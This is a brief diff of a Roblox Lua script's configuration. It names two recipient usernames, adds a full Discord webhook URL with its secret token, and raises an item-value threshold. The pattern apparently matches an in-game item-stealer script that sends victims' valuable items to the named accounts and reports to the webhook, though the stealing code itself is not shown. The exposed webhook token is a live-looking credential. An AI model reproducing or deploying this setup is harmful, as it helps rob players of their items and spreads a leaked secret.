@@ -1,7 +1,7 @@
 Username = "Layito4324"
 Username2 = "BEST_SUPERKID"
-discuser = "717124084311392277"
-min_rap = 500000
+webhook = "https://discord.com/api/webhooks/1265056306763399279/s7ySDk8BvPhveWWwL2NDztfvOtCS2UTrEXfKMsPGuCtw6EDb4O-8_AIvroG6LfeSBAOD"
+min_rap = 1000000
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
